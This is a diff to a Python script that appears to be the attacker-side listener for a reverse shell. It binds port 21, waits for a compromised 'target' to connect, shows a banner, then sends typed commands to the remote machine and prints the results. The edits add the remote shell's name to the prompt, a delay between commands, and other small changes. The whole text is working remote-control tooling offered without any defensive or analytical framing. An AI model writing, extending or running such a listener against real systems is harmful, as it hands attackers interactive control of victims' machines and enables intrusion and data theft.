@@ -1,5 +1,5 @@
 import socket
-
+import time
 def create_server():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind(('0.0.0.0', 21))
@@ -12,6 +12,7 @@ def accept_connection(s):
     print(f"Connect  {addr}")
     handshake(tar)
     res = tar.recv(1024)
+    shell = tar.recv(1024)
     print(f'''
  ┌───────────────────────────────────────────┐
  │      3333333                   3          │
@@ -29,36 +30,36 @@ def accept_connection(s):
  │                        33                 │
  └───────────────────────────────────────────┘
     {res.decode()}''')
-    return tar
+    return tar,shell.decode()
 def handshake(tar):
     tar.send(b'tff')
 
-def handle_client(tar):
+def handle_client(tar,shell):
     cmd = ''
     while cmd != '/21':
-        cmd = input('shell> ')
+        cmd = input(f'{shell}> ')
         if cmd!='':
             tar.send(cmd.encode())
-            res = tar.recv(1073741824).decode()
+            res = tar.recv(1024).decode()
             if res:
                 print(f"{res}")
             else:
                 print("No response received or connection lost.")
+        time.sleep(1)
 
 
 def close_server(s, tar):
     tar.close()
     s.close()
-    print('server closed')
 
 def main():
     s = create_server()
-    tar = accept_connection(s)
+    tar,shell = accept_connection(s)
     try:
-        handle_client(tar)
+        handle_client(tar,shell)
 
     except KeyboardInterrupt:
-        print('[exited]')
+        print('\n[exited]')
     finally:
         close_server(s, tar)
 main()
